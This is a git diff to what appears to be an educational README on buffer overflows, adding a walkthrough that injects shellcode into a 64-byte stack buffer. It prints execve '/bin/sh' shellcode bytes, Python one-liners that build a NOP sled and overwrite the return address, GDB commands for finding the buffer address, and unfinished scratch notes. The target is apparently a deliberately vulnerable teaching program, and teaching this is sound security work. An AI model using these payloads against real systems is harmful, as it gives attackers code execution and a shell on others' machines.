@@ -140,6 +140,45 @@ This example follows a similar structure to the previous, but instead of overwri
 This example will use the same [code as Example 1]((https://github.com/syclops/buffer-overflow-examples)) and shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-603.php)). However, we will change the example code such that `BUFFER_SIZE = 64` as this example will require a given buffer large enough to fit our shellcode.
 
 
+### Step 1: Set up text input
+
+For this attack we are trying to fit our shell code into 64 bytes, along with our no-ops. In bytes, our shell code is written as `b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05`.
+
+Our shell code is 30 bytes, so we can add 34 no-ops to our shell code to fill the buffer. We will write this to a text file for ease of use. using the following code:
+
+`python3 -c 'import sys; sys.stdout.buffer.write( b"\x90"*34 + b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")' > ex.txt
+`
+
+### Step 2: Find address of buffer input
+
+From our example code, we can see that our `getbuf`function is on line 34, and we can enter a breakpoint there. We don't want to call this line of code, but inside of this function we have the line of code that opens our buffer, so we can find the address through this method.
+
+![](images/getbufstop.png)
+
+For this attack we will use GDB to view the memory view, since CLion has a security feature implemented that changes stack addresses on each compile, making this attack impossible to carry out.
+
+So, after we build our program using cmake (NOT using CLion build), we can run our debugger.
+
+We can step into this function using the `s` command, and then view the first 100 adresses in the stack using the `x/100x $sp` command. Since we have put a series of `\90`s, we can easily see where our input begins.
+
+![](images/new_address.png)
+
+In the stack we can see our no ops start at the address `0x7fffffffdbc0`.
+
+### Step 3: Replace return address
+
+In order to execute this attack, we need to replace the return address with the address we selected in the last step, so that we can go back through the shell code and progress from the no op sled to the attacks.
+
+To do this, we must convert our address to a little endian format. This means we will input the address in byte form as `\xc0\xdb\xff\xff\xff\xff\xff\x7f`. We can add this to our text file with the following code:
+
+`python3 -c 'import sys; sys.stdout.buffer.write( b"\x90"*26 + b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + b"\xc0\xdb\xff\xff\xff\xff\xff\x7f" * 2)' > ex.txt
+`
+
+
+
+
+
+
 
 
 <!-- python3 -c 'import sys; sys.stdout.write( "\x90"*10 + "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + "\xc4\x2f\x4c")' | ./foo -->
@@ -151,6 +190,8 @@ Sabrina stack address : 7fff ffffd8a0
 
 \xff\x7f\x00\x00   \xa0\xd8\xff\xff
 
+64 + 8 - 30 - 8 = 34
+64 + 4 - 30 - 8 = 32
 <!--
 python3 -c 'import sys; sys.stdout.buffer.write( b"\x90"*10 + b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + b"\xc4\x2f\x4c")' > ex.txt -->
 
